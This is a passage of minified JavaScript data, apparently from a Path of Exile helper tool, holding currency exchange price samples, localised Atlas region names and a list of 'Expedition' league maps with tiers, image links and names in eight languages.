Coin","pay":{"id":0,"league_id":1,"pay_currency_id":13,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":4,"value":200,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":13,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":34,"value":0.011368279569892474,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,2.35,-7.37,-12.56,-16.67,-10.22,-4.79],"totalChange":-4.79},"chaosEquivalent":0.01,"lowConfidencePaySparkLine":{"data":[0,0.22,-2.43,-4.97,-4.97,2.72,2.72],"totalChange":2.72},"lowConfidenceReceiveSparkLine":{"data":[0,2.35,-7.37,-12.56,-16.67,-10.22,-4.79],"totalChange":-4.79},"detailsId":"perandus-coin"},"Orb of Transmutation":{"currencyTypeName":"Orb of Transmutation","pay":{"id":0,"league_id":1,"pay_currency_id":21,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":4,"value":196.62,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":21,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":53,"value":0.01613,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,0,null,21.78,21.78,null,null],"totalChange":21.78},"receiveSparkLine":{"data":[0,0,-0.42,-0.12,-2.46,-5.76,-3.24],"totalChange":-3.24},"chaosEquivalent":0.01,"lowConfidencePaySparkLine":{"data":[0,0,-1.33,21.78,21.78,22.08,22.06],"totalChange":22.06},"lowConfidenceReceiveSparkLine":{"data":[0,0,-0.42,-0.12,-2.46,-5.76,-3.24],"totalChange":-3.24},"detailsId":"orb-of-transmutation"},"Portal Scroll":{"currencyTypeName":"Portal Scroll","pay":{"id":0,"league_id":1,"pay_currency_id":24,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":4,"value":364.8484848484849,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":24,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":38,"value":0.014209822916666667,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,0,0,-0.12,-4.8,-4.8,-14.76],"totalChange":-14.76},"chaosEquivalent":0.01,"lowConfidencePaySparkLine":{"data":[0,-23.5,14.82,46.05,46.05,52.82,76.13],"totalChange":76.13},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,-0.12,-4.8,-4.8,-14.76],"totalChange":-14.76},"detailsId":"portal-scroll"},"Armourer\'s Scrap":{"currencyTypeName":"Armourer\'s Scrap","pay":{"id":0,"league_id":1,"pay_currency_id":26,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":6,"value":197.55050505050505,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":26,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":34,"value":0.02,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[null,null,null,0,0,null,4.57],"totalChange":4.57},"receiveSparkLine":{"data":[0,0.72,1.65,10.01,9.9,10.01,10.01],"totalChange":10.01},"chaosEquivalent":0.01,"lowConfidencePaySparkLine":{"data":[0,0,1.53,0.71,0.71,1.73,5.31],"totalChange":5.31},"lowConfidenceReceiveSparkLine":{"data":[0,0.72,1.65,10.01,9.9,10.01,10.01],"totalChange":10.01},"detailsId":"armourers-scrap"}},"updated":1548166976379}'),REGIONS=[{regionId:-1,names:[{name:"Other",language:{code:"en"}},{name:"Other",language:{code:"fr"}},{name:"Other",language:{code:"de"}},{name:"Other",language:{code:"ko"}},{name:"Other",language:{code:"pt"}},{name:"Other",language:{code:"ru"}},{name:"Other",language:{code:"es"}},{name:"Other",language:{code:"th"}}]},{regionId:0,names:[{name:"Haewark Hamlet",language:{code:"en"}},{name:"Le Hameau d'Haewark",language:{code:"fr"}},{name:"Haewark Hamlet",language:{code:"de"}},{name:"헤이워크 촌락",language:{code:"ko"}},{name:"Aldeia de Haewark",language:{code:"pt"}},{name:"Деревня Хейварк",language:{code:"ru"}},{name:"Aldea de Haewark",language:{code:"es"}},{name:"Haewark Hamlet",language:{code:"th"}}]},{regionId:1,names:[{name:"Tirn's End",language:{code:"en"}},{name:"La Lisière de Tirn",language:{code:"fr"}},{name:"Tirns Ende",language:{code:"de"}},{name:"티른의 끝자락",language:{code:"ko"}},{name:"Fim de Tirn",language:{code:"pt"}},{name:"Предел Тирна",language:{code:"ru"}},{name:"El final de Tirn",language:{code:"es"}},{name:"Tirn's End",language:{code:"th"}}]},{regionId:2,names:[{name:"Lex Proxima",language:{code:"en"}},{name:"Lex Proxima",language:{code:"fr"}},{name:"Lex Proxima",language:{code:"de"}},{name:"렉스 프록시마",language:{code:"ko"}},{name:"Lex Proxima",language:{code:"pt"}},{name:"Лекс Проксима",language:{code:"ru"}},{name:"Lex Proxima",language:{code:"es"}},{name:"Lex Proxima",language:{code:"th"}}]},{regionId:3,names:[{name:"Lex Ejoris",language:{code:"en"}},{name:"Lex Ejoris",language:{code:"fr"}},{name:"Lex Ejoris",language:{code:"de"}},{name:"렉스 에요리스",language:{code:"ko"}},{name:"Lex Ejoris",language:{code:"pt"}},{name:"Лекс Эйорис",language:{code:"ru"}},{name:"Lex Ejoris",language:{code:"es"}},{name:"Lex Ejoris",language:{code:"th"}}]},{regionId:4,names:[{name:"New Vastir",language:{code:"en"}},{name:"Nouveau-Vastir",language:{code:"fr"}},{name:"Neu Vastir",language:{code:"de"}},{name:"뉴 바스티르",language:{code:"ko"}},{name:"Nova Vastir",language:{code:"pt"}},{name:"Новый Вастир",language:{code:"ru"}},{name:"Nuevo Vastir",language:{code:"es"}},{name:"New Vastir",language:{code:"th"}}]},{regionId:5,names:[{name:"Glennach Cairns",language:{code:"en"}},{name:"Les Cairns de Glennach",language:{code:"fr"}},{name:"Glennach Cairns",language:{code:"de"}},{name:"글렌나크 돌무덤",language:{code:"ko"}},{name:"Marcos de Glennach",language:{code:"pt"}},{name:"Пирамиды Гленнаха",language:{code:"ru"}},{name:"Túmulos de Glennach",language:{code:"es"}},{name:"Glennach Cairns",language:{code:"th"}}]},{regionId:6,names:[{name:"Valdo's Rest",language:{code:"en"}},{name:"Le Repos de Valdo",language:{code:"fr"}},{name:"Valdos Rast",language:{code:"de"}},{name:"발도의 휴식처",language:{code:"ko"}},{name:"Descanso de Valdo",language:{code:"pt"}},{name:"Покой Валдо",language:{code:"ru"}},{name:"El descanso de Valdo",language:{code:"es"}},{name:"Valdo's Rest",language:{code:"th"}}]},{regionId:7,names:[{name:"Lira Arthain",language:{code:"en"}},{name:"Lira Arthain",language:{code:"fr"}},{name:"Lira Arthain",language:{code:"de"}},{name:"리라 아르타인",language:{code:"ko"}},{name:"Lira Arthain",language:{code:"pt"}},{name:"Лира Артейн",language:{code:"ru"}},{name:"Lira Arthain",language:{code:"es"}},{name:"Lira Arthain",language:{code:"th"}}]}],MAPS={id:16,name:"Expedition",maps:[{id:408,tier:3,tiers:[3,7,10,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Museum.png?scale=1&mn=11&mt=",names:[{name:"Museum Map",language:{code:"en"}},{name:"Musée, Carte",language:{code:"fr"}},{name:"'Museum'-Karte",language:{code:"de"}},{name:"박물관 지도(Museum Map)",language:{code:"ko"}},{name:"Mapa: Museu",language:{code:"pt"}},{name:"Карта музея",language:{code:"ru"}},{name:"Mapa de Museo",language:{code:"es"}},{name:"Museum Map",language:{code:"th"}}],region:4},{id:708,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/UberVaal04.png",names:[{name:"Mortal Grief",language:{code:"en"}},{name:"Chagrin mortifère",language:{code:"fr"}},{name:"Tödliche Trauer",language:{code:"de"}},{name:"필멸의 슬픔",language:{code:"ko"}},{name:"Pesar Mortal",language:{code:"pt"}},{name:"Смертное уныние",language:{code:"ru"}},{name:"Dolor Mortal",language:{code:"es"}},{name:"Mortal Grief",language:{code:"th"}}],region:-1},{id:600,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/UniqueMap1.png",names:[{name:"Vaults of Atziri",language:{code:"en"}},{name:"La Salle des coffres d'Atziri",language:{code:"fr"}},{name:"Atziris Gewölbe",language:{code:"de"}},{name:"앗지리의 금고실(Vaults of Atziri)",language:{code:"ko"}},{name:"Relíquias de Atziri",language:{code:"pt"}},{name:"Сокровищница Атзири",language:{code:"ru"}},{name:"Cámaras de Atziri",language:{code:"es"}},{name:"Vaults of Atziri",language:{code:"th"}}],region:-1},{id:461,tier:16,tiers:[16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Hydra.png?scale=1&mn=11&mt=",names:[{name:"Lair of the Hydra Map",language:{code:"en"}},{name:"Antre de l'Hydre, Carte",language:{code:"fr"}},{name:"'Versteck der Hydra'-Karte",language:{code:"de"}},{name:"히드라의 소굴 지도(Lair of the Hydra Map)",language:{code:"ko"}},{name:"Mapa: Covil da Hidra",language:{code:"pt"}},{name:"Карта логова Гидры",language:{code:"ru"}},{name:"Mapa de Guarida de la Hidra",language:{code:"es"}},{name:"Lair of the Hydra Map",language:{code:"th"}}],region:-1},{id:705,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/UberVaal01.png",names:[{name:"Mortal Rage",language:{code:"en"}},{name:"Rage mortifère",language:{code:"fr"}},{name:"Tödliche Wut",language:{code:"de"}},{name:"필멸의 격노",language:{code:"ko"}},{name:"Fúria Mortal",language:{code:"pt"}},{name:"Смертный гнев",language:{code:"ru"}},{name:"Furia Mortal",language:{code:"es"}},{name:"Mortal Rage",language:{code:"th"}}],region:-1},{id:354,tier:4,tiers:[4,8,11,13,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Beacon.png?scale=1&mn=11&mt=",names:[{name:"Lighthouse Map",language:{code:"en"}},{name:"Phare, Carte",language:{code:"fr"}},{name:"'Leuchtturm'-Karte",language:{code:"de"}},{name:"등대 지도(Lighthouse Map)",language:{code:"ko"}},{name:"Mapa: Torre do Farol",language:{code:"pt"}},{name:"Карта навигационной башни",language:{code:"ru"}},{name:"Mapa de Faro",language:{code:"es"}},{name:"Lighthouse Map",language:{code:"th"}}],region:4},{id:849,tier:11,tiers:[0,0,11,13,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Bramblefall.png?scale=1&mn=11&mt=",names:[{name:"Bramble Valley Map",language:{code:"en"}},{name:"Bramble Valley Map",language:{code:"fr"}},{name:"Bramble Valley Map",language:{code:"de"}},{name:"Bramble Valley Map",language:{code:"ko"}},{name:"Bramble Valley Map",language:{code:"pt"}},{name:"Bramble Valley Map",language:{code:"ru"}},{name:"Bramble Valley Map",language:{code:"es"}},{name:"Bramble Valley Map",language:{code:"th"}}],region:3},{id:447,tier:3,tiers:[3,6,10,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Core.png?scale=1&mn=11&mt=",names:[{name:"Core Map",language:{code:"en"}},{name:"Cœur, Carte",language:{code:"fr"}},{name:"'Schwarzer Kern'-Karte",language:{code:"de"}},{name:"중심부 지도(Core Map)",language:{code:"ko"}},{name:"Mapa: Núcleo",language:{code:"pt"}},{name:"Карта сердца",language:{code:"ru"}},{name:"Mapa de Núcleo",language:{code:"es"}},{name:"Core Map",language:{code:"th"}}],region:7},{id:731,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsFire.png",names:[{name:"Xoph's Breachstone",language:{code:"en"}},{name:"Pierre de Brèche de Xoph",language:{code:"fr"}},{name:"Xophs Riss-Stein",language:{code:"de"}},{name:"조프의 균열석",language:{code:"ko"}},{name:"Pedra da Fenda de Xoph",language:{code:"pt"}},{name:"Камень Разлома Ксофа",language:{code:"ru"}},{name:"Piedra de Fisura de Xoph",language:{code:"es"}},{name:"Xoph's Breachstone",language:{code:"th"}}],region:-1},{id:601,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/MaelstromofChaos.png",names:[{name:"Maelström of Chaos",language:{code:"en"}},{name:"Le Maelström du chaos",language:{code:"fr"}},{name:"Mahlstrom des Chaos",language:{code:"de"}},{name:"혼돈의 마엘스트롬(Maelström of Chaos)",language:{code:"ko"}},{name:"Vórtice do Caos",language:{code:"pt"}},{name:"Вихрь хаоса",language:{code:"ru"}},{name:"Vorágine de Caos",language:{code:"es"}},{name:"Maelström of Chaos",language:{code:"th"}}],region:-1},{id:624,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/SynthesisFireGuardianMap.png",names:[{name:"Augmented Distant Memory",language:{code:"en"}},{name:"Souvenir lointain exacerbé",language:{code:"fr"}},{name:"Verstärkte entfernte Erinnerung",language:{code:"de"}},{name:"강화된 희미한 기억(Augmented Distant Memory)",language:{code:"ko"}},{name:"Memória Distante Aumentada",language:{code:"pt"}},{name:"Дополненное отдалённое воспоминание",language:{code:"ru"}},{name:"Memoria Lejana Mejorada",language:{code:"es"}},{name:"ความทรงจำที่ห่างไกลที่ถูกแต่งเติม",language:{code:"th"}}],region:-1},{id:735,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsChaos.png",names:[{name:"Chayula's Breachstone",language:{code:"en"}},{name:"Pierre de Brèche de Chayula",language:{code:"fr"}},{name:"Chayulas Riss-Stein",language:{code:"de"}},{name:"차율라의 균열석",language:{code:"ko"}},{name:"Pedra da Fenda de Chayula",language:{code:"pt"}},{name:"Камень Разлома Чаюлы",language:{code:"ru"}},{name:"Piedra de Fisura de Chayula",language:{code:"es"}},{name:"Chayula's Breachstone",language:{code:"th"}}],region:-1},{id:741,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/XophsEnrichedBreachstone.png",names:[{name:"Xoph's Enriched Breachstone",language:{code:"en"}},{name:"Pierre de Brèche enrichie de Xoph",language:{code:"fr"}},{name:"Xophs angereicherter Riss-Stein",language:{code:"de"}},{name:"조프의 풍부한 균열석",language:{code:"ko"}},{name:"Pedra de Fenda Enriquecida de Xoph",language:{code:"pt"}},{name:"Обогащённый камень Разлома Ксофа",language:{code:"ru"}},{name:"Piedra de Fisura Enriquecida de Xoph",language:{code:"es"}},{name:"Xoph's Enriched Breachstone",language:{code:"th"}}],region:-1},{id:373,tier:4,tiers:[4,7,11,13,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/DryWoods.png?scale=1&mn=11&mt=",names:[{name:"Ashen Wood Map",language:{code:"en"}},{name:"Bois cendreux, Carte",language:{code:"fr"}},{name:"'Vertrockneter Wald'-Karte",language:{code:"de"}},{name:"잿빛 숲 지도(Ashen Wood Map)",language:{code:"ko"}},{name:"Mapa: Mata Cinzenta",language:{code:"pt"}},{name:"Карта пепельного леса",language:{code:"ru"}},{name:"Mapa de Selva Pálida",language:{code:"es"}},{name:"Ashen Wood Map",language:{code:"th"}}],region:2},{id:387,tier:4,tiers:[4,7,10,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Bazaar.png?scale=1&mn=11&mt=",names:[{name:"Bazaar Map",language:{code:"en"}},{name:"Bazar, Carte",language:{code:"fr"}},{name:"'Basar'-Karte",language:{code:"de"}},{name:"장터 지도(Bazaar Map)",language:{code:"ko"}},{name:"Mapa: Bazar",language:{code:"pt"}},{name:"Карта базара",language:{code:"ru"}},{name:"Mapa de Bazar",language:{code:"es"}},{name:"Bazaar Map",language:{code:"th"}}],region:7},{id:625,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/SynthesisLightningGuardianMap.png",names:[{name:"Twisted Distant Memory",language:{code:"en"}},{name:"Souvenir lointain déformé",language:{code:"fr"}},{name:"Verdorbene entfernte Erinnerung",language:{code:"de"}},{name:"뒤틀린 희미한 기억(Twisted Distant Memory)",language:{code:"ko"}},{name:"Memória Distante Distorcida",language:{code:"pt"}},{name:"Искаженное отдалённое воспоминание",language:{code:"ru"}},{name:"Memoria Lejana Retorcida",language:{code:"es"}},{name:"ความทรงจำที่ห่างไกลที่ถูกบิดเบือน",language:{code:"th"}}],region:-1},{id:444,tier:3,tiers:[3,6,10,12,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Shrine.png?scale=1&mn=11&mt=",names:[{name:"Shrine Map",language:{code:"en"}},{name:"Sanctuaire, Carte",language:{code:"fr"}},{name:"'Schrein'-Karte",language:{code:"de"}},{name:"성소 지도(Shrine Map)",language:{code:"ko"}},{name:"Mapa: Altar",language:{code:"pt"}},{name:"Карта святыни",language:{code:"ru"}},{name:"Mapa de Santuario",language:{code:"es"}},{name:"Shrine Map",language:{code:"th"}}],region:1},{id:365,tier:3,tiers:[3,6,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Barrows.png?scale=1&mn=11&mt=",names:[{name:"Barrows Map",language:{code:"en"}},{name:"Tertres, Carte",language:{code:"fr"}},{name:"'Hügelgräber'-Karte",language:{code:"de"}},{name:"고분 지도(Barrows Map)",language:{code:"ko"}},{name:"Mapa: Tumuli",language:{code:"pt"}},{name:"Карта кургана",language:{code:"ru"}},{name:"Mapa de Túmulos",language:{code:"es"}},{name:"Barrows Map",language:{code:"th"}}],region:4},{id:726,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/UberElder02.png",names:[{name:"Fragment of Emptiness",language:{code:"en"}},{name:"Fragment du Vide",language:{code:"fr"}},{name:"Fragment der Leere",language:{code:"de"}},{name:"허무의 조각",language:{code:"ko"}},{name:"Fragmento do Vazio",language:{code:"pt"}},{name:"Фрагмент пустоты",language:{code:"ru"}},{name:"Fragmento de vacío",language:{code:"es"}},{name:"Fragment of Emptiness",language:{code:"th"}}],region:-1},{id:357,tier:14,tiers:[0,0,0,0,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Corrosion.png?scale=1&mn=11&mt=",names:[{name:"Sulphur Vents Map",language:{code:"en"}},{name:"Geysers de soufre, Carte",language:{code:"fr"}},{name:"'Schwefelquellen'-Karte",language:{code:"de"}},{name:"유황 분출구 지도(Sulphur Vents Map)",language:{code:"ko"}},{name:"Mapa: Aberturas de Enxofre",language:{code:"pt"}},{name:"Карта серного озера",language:{code:"ru"}},{name:"Mapa de Fumarolas de Azufre",language:{code:"es"}},{name:"Sulphur Vents Map",language:{code:"th"}}],region:5},{id:736,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/XophsChargedBreachstone.png",names:[{name:"Xoph's Charged Breachstone",language:{code:"en"}},{name:"Pierre de Brèche chargée de Xoph",language:{code:"fr"}},{name:"Xophs geladener Riss-Stein",language:{code:"de"}},{name:"조프의 충전된 균열석",language:{code:"ko"}},{name:"Pedra de Fenda Energizada de Xoph",language:{code:"pt"}},{name:"Заряженный камень Разлома Ксофа",language:{code:"ru"}},{name:"Piedra de Fisura Cargada de Xoph",language:{code:"es"}},{name:"Xoph's Charged Breachstone",language:{code:"th"}}],region:-1},{id:627,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/SynthesisBossGuardianMap.png",names:[{name:"Cortex",language:{code:"en"}},{name:"Le Cortex",language:{code:"fr"}},{name:"Cortex",language:{code:"de"}},{name:"코텍스(Cortex)",language:{code:"ko"}},{name:"Córtex",language:{code:"pt"}},{name:"Кора",language:{code:"ru"}},{name:"Córtex",language:{code:"es"}},{name:"Cortex",language:{code:"th"}}],region:-1},{id:704,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/VaalComplete.png",names:[{name:"Sacrifice Set",language:{code:"en"}},{name:"Ensemble du sacrifice",language:{code:"fr"}},{name:"Opfergaben-Set",language:{code:"de"}},{name:"희생 세트",language:{code:"ko"}},{name:"Conjunto de Sacrifícios",language:{code:"pt"}},{name:"Набор Жертв",language:{code:"ru"}},{name:"Set de Sacrificio",language:{code:"es"}},{name:"Sacrifice Set",language:{code:"th"}}],region:-1},{id:749,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/UulNetolsPureBreachstone.png",names:[{name:"Uul-Netol's Pure Breachstone",language:{code:"en"}},{name:"Pierre de Brèche pure d'Uul-Netol",language:{code:"fr"}},{name:"Uul-Netols purer Riss-Stein",language:{code:"de"}},{name:"울네톨의 순수한 균열석",language:{code:"ko"}},{name:"Pedra de Fenda Pura de Uul-Netol",language:{code:"pt"}},{name:"Очищенный камень Разлома Уул-Нетол",language:{code:"ru"}},{name:"Piedra de Fisura Pura de Uul-Netol",language:{code:"es"}},{name:"Uul-Netol's Pure Breachstone",language:{code:"th"}}],region:-1},{id:395,tier:5,tiers:[5,9,12,14,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/MudGeyser.png?scale=1&mn=11&mt=",names:[{name:"Mud Geyser Map",language:{code:"en"}},{name:"Geyser boueux, Carte",language:{code:"fr"}},{name:"'Schlammgeysir'-Karte",language:{code:"de"}},{name:"진흙 간헐천 지도(Mud Geyser Map)",language:{code:"ko"}},{name:"Mapa: Gêiser de Lama",language:{code:"pt"}},{name:"Карта грязевого гейзера",language:{code:"ru"}},{name:"Mapa de Géiser de Fango",language:{code:"es"}},{name:"Mud Geyser Map",language:{code:"th"}}],region:4},{id:851,tier:6,tiers:[0,6,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/CrimsonTownship.png?scale=1&mn=11&mt=",names:[{name:"Crimson Township Map",language:{code:"en"}},{name:"Crimson Township Map",language:{code:"fr"}},{name:"Crimson Township Map",language:{code:"de"}},{name:"Crimson Township Map",language:{code:"ko"}},{name:"Crimson Township Map",language:{code:"pt"}},{name:"Crimson Township Map",language:{code:"ru"}},{name:"Crimson Township Map",language:{code:"es"}},{name:"Crimson Township Map",language:{code:"th"}}],region:1},{id:371,tier:8,tiers:[0,8,11,13,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Thicket.png?scale=1&mn=11&mt=",names:[{name:"Thicket Map",language:{code:"en"}},{name:"Bosquet, Carte",language:{code:"fr"}},{name:"'Dickicht'-Karte",language:{code:"de"}},{name:"잡목림 지도(Thicket Map)",language:{code:"ko"}},{name:"Mapa: Matagal",language:{code:"pt"}},{name:"Карта чащи",language:{code:"ru"}},{name:"Mapa de Matorral",language:{code:"es"}},{name:"Thicket Map",language:{code:"th"}}],region:7},{id:449,tier:3,tiers:[3,6,10,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/SulphurVents.png?scale=1&mn=11&mt=",names:[{name:"Acid Caverns Map",language:{code:"en"}},{name:"Cavernes d'acide, Carte",language:{code:"fr"}},{name:"'Ätzende Höhlen'-Karte",language:{code:"de"}},{name:"산성 암굴 지도(Acid Caverns Map)",language:{code:"ko"}},{name:"Mapa: Cavernas Ácidas",language:{code:"pt"}},{name:"Карта едких пещер",language:{code:"ru"}},{name:"Mapa de Cavernas Ácidas",language:{code:"es"}},{name:"Acid Caverns Map",language:{code:"th"}}],region:2},{id:719,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/ShaperComplete.png",names:[{name:"Key to the Crucible",language:{code:"en"}},{name:"Clé du Creuset",language:{code:"fr"}},{name:"Schlüssel zum Schmelztiegel",language:{code:"de"}},{name:"시련의 열쇠",language:{code:"ko"}},{name:"Chave para o Crisol",language:{code:"pt"}},{name:"Ключ к Тиглю",language:{code:"ru"}},{name:"Llave hacia el Crisol",language:{code:"es"}},{name:"Key to the Crucible",language:{code:"th"}}],region:-1},{id:443,tier:3,tiers:[3,7,10,13,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/HighGardens.png?scale=1&mn=11&mt=",names:[{name:"Terrace Map",language:{code:"en"}},{name:"Terrasses, Carte",language:{code:"fr"}},{name:"'Terrasse'-Karte",language:{code:"de"}},{name:"테라스 지도(Terrace Map)",language:{code:"ko"}},{name:"Mapa: Terraço",language:{code:"pt"}},{name:"Карта террасы",language:{code:"ru"}},{name:"Mapa de Terraza",language:{code:"es"}},{name:"Terrace Map",language:{code:"th"}}],region:1},{id:381,tier:3,tiers:[3,7,10,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Ramparts.png?scale=1&mn=11&mt=",names:[{name:"Ramparts Map",language:{code:"en"}},{name:"Remparts, Carte",language:{code:"fr"}},{name:"'Befestigungen'-Karte",language:{code:"de"}},{name:"성벽 지도(Ramparts Map)",language:{code:"ko"}},{name:"Mapa: Fortaleza",language:{code:"pt"}},{name:"Карта бастиона",language:{code:"ru"}},{name:"Mapa de Murallas",language:{code:"es"}},{name:"Ramparts Map",language:{code:"th"}}],region:7},{id:617,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/HarbingerWhite.png",names:[{name:"The Beachhead",language:{code:"en"}},{name:"La Tête de pont",language:{code:"fr"}},{name:"Der Brückenkopf",language:{code:"de"}},{name:"교두보(The Beachhead)",language:{code:"ko"}},{name:"A Cabeça de Ponte",language:{code:"pt"}},{name:"Плацдарм",language:{code:"ru"}},{name:"La Cabecera de la Playa",language:{code:"es"}},{name:"The Beachhead",language:{code:"th"}}],region:-1},{id:609,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/DeathandTaxes.png",names:[{name:"Death and Taxes",language:{code:"en"}},{name:"La Mort et les Impôts",language:{code:"fr"}},{name:"Der sichere Tod",language:{code:"de"}},{name:"죽음과 의무(Death and Taxes)",language:{code:"ko"}},{name:"Morte e Impostos",language:{code:"pt"}},{name:"Смерть и налоги",language:{code:"ru"}},{name:"Muerte e Impuestos",language:{code:"es"}},{name:"Death and Taxes",language:{code:"th"}}],region:-1},{id:457,tier:4,tiers:[4,7,10,12,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/SunkenCity.png?scale=1&mn=11&mt=",names:[{name:"Sunken City Map",language:{code:"en"}},{name:"Cité engloutie, Carte",language:{code:"fr"}},{name:"'Versunkene Stadt'-Karte",language:{code:"de"}},{name:"물에 잠긴 도시 지도(Sunken City Map)",language:{code:"ko"}},{name:"Mapa: Cidade Afundada",language:{code:"pt"}},{name:"Карта затонувшего города",language:{code:"ru"}},{name:"Mapa de Ciudad Hundida",language:{code:"es"}},{name:"Sunken City Map",language:{code:"th"}}],region:7},{id:703,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Vaal04.png",names:[{name:"Sacrifice at Dusk",language:{code:"en"}},{name:"Sacrifice au crépuscule",language:{code:"fr"}},{name:"Opfergabe bei Abenddämmerung",language:{code:"de"}},{name:"황혼의 희생",language:{code:"ko"}},{name:"Sacrifício ao Anoitecer",language:{code:"pt"}},{name:"Жертва на закате",language:{code:"ru"}},{name:"Sacrificio al Anochecer",language:{code:"es"}},{name:"Sacrifice at Dusk",language:{code:"th"}}],region:-1},{id:450,tier:11,tiers:[0,0,0,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/DarkForest.png?scale=1&mn=11&mt=",names:[{name:"Dark Forest Map",language:{code:"en"}},{name:"Forêt obscure, Carte",language:{code:"fr"}},{name:"'Dunkelforst'-Karte",language:{code:"de"}},{name:"어둠의 숲 지도(Dark Forest Map)",language:{code:"ko"}},{name:"Mapa: Floresta Negra",language:{code:"pt"}},{name:"Карта мрачного леса",language:{code:"ru"}},{name:"Mapa de Bosque Oscuro",language:{code:"es"}},{name:"Dark Forest Map",language:{code:"th"}}],region:1},{id:744,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/UulNetolsEnrichedBreachstone.png",names:[{name:"Uul-Netol's Enriched Breachstone",language:{code:"en"}},{name:"Pierre de Brèche enrichie d'Uul-Netol",language:{code:"fr"}},{name:"Uul-Netols angereicherter Riss-Stein",language:{code:"de"}},{name:"울네톨의 풍부한 균열석",language:{code:"ko"}},{name:"Pedra de Fenda Enriquecida de Uul-Netol",language:{code:"pt"}},{name:"Обогащённый камень Разлома Уул-Нетол",language:{code:"ru"}},{name:"Piedra de Fisura Enriquecida de Uul-Netol",language:{code:"es"}},{name:"Uul-Netol's Enriched Breachstone",language:{code:"th"}}],region:-1},{id:711,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/PaleCourt02.png",names:[{name:"Yriel's Key",language:{code:"en"}},{name:"Clé d'Yriel",language:{code:"fr"}},{name:"Yriels Schlüssel",language:{code:"de"}},{name:"이리엘의 열쇠",language:{code:"ko"}},{name:"Chave de Yriel",language:{code:"pt"}},{name:"Ключ Ириэла",language:{code:"ru"}},{name:"Llave de Yriel",language:{code:"es"}},{name:"Yriel's Key",language:{code:"th"}}],region:-1},{id:382,tier:4,tiers:[4,7,11,12,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Dunes.png?scale=1&mn=11&mt=",names:[{name:"Dunes Map",language:{code:"en"}},{name:"Dunes, Carte",language:{code:"fr"}},{name:"'Dünen'-Karte",language:{code:"de"}},{name:"사구 지도(Dunes Map)",language:{code:"ko"}},{name:"Mapa: Dunas",language:{code:"pt"}},{name:"Карта дюн",language:{code:"ru"}},{name:"Mapa de Dunas",language:{code:"es"}},{name:"Dunes 